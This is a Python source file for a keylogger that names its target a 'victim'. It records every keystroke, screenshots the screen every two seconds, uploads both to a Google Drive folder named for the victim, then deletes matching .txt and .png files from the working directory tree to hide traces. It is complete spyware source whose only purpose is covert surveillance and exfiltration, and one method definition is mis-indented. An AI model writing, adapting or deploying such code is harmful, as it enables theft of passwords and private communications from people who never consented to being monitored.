import keyboard # for keylogs
from threading import Timer
from datetime import datetime
import pickle
import os
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from googleapiclient.http import MediaFileUpload
import pyautogui
from multiprocessing import Process
import psutil
import os


SEND_REPORT_EVERY = 5  # in seconds, 900 means 15 minute and so on
VICTIM_NAME="ANONYMOUS"

class Keylogger:
    def __init__(self, interval, victim_name, report_method="file" ):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.victim_name=victim_name
        self.counter=0

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"{self.victim_name}-keylog-{start_dt_str}_{end_dt_str}.txt"

    def report_to_file(self):
        with open(f"{self.filename}", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}")

    def take_screenshot(self):
        current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"{self.victim_name}_screenshot_{current_time}_{self.counter}.png"
        pyautogui.screenshot(filename)
        self.counter += 1
        self.upload_files(filename)
        Timer(2, self.take_screenshot).start()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.report_to_file()
            self.upload_files(self.filename)
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()


    def get_gdrive_service(self):
        SCOPES = ['https://www.googleapis.com/auth/drive.metadata.readonly',
                  'https://www.googleapis.com/auth/drive.file']
        creds = None
        if os.path.exists('token.pickle'):
            with open('token.pickle', 'rb') as token:
                creds = pickle.load(token)
        if not creds or not creds.valid:
            if creds and creds.expired and creds.refresh_token:
                creds.refresh(Request())
            else:
                flow = InstalledAppFlow.from_client_secrets_file(
                    'credentials.json', SCOPES)
                creds = flow.run_local_server(port=0)
            with open('token.pickle', 'wb') as token:
                pickle.dump(creds, token)

        return build('drive', 'v3', credentials=creds)

    def get_id(self, service):
        results = service.files().list(
            q=f"mimeType='application/vnd.google-apps.folder' and name='{self.victim_name}' and trashed = false",
            fields='nextPageToken, files(id, name)').execute()
        items = results.get('files', [])
        if items:
            folder_id = items[0]['id']
        else:
            folder_id = None
        return folder_id

    def upload_files(self, filename):
        service = self.get_gdrive_service()
        check = self.get_id(service)
        if check == None:
            folder_metadata = {
                "name": f"{self.victim_name}",
                "mimeType": "application/vnd.google-apps.folder"
            }
            file = service.files().create(body=folder_metadata, fields="id").execute()
            # get the folder id
            folder_id = file.get("id")
            print("Folder ID:", folder_id)
            file_metadata = {
                "name": f"{filename}",
                "parents": [folder_id]
            }
        elif check != None:
            file_metadata = {
                "name": f"{filename}",
                "parents": [check]
            }
        media = MediaFileUpload(f"{filename}", resumable=True)
        service.files().create(body=file_metadata, media_body=media, fields='id').execute()
        self.my_cleanup_function()


    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            self.my_cleanup_function()

   

     def my_cleanup_function(self):
            directory= os.getcwd()
            for root, dirs, files in os.walk(directory):
                for file in files:
                    path = os.path.join(root, file)
                    if (path.endswith(".txt") or path.endswith(".png")):
                        try:
                            os.remove(path)
                        except:
                            pass
                        


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, victim_name=VICTIM_NAME, report_method="file")
    p2 = Process(target=keylogger.take_screenshot)
    p2.start()
    p1 = Process(target=keylogger.start)
    p1.start()


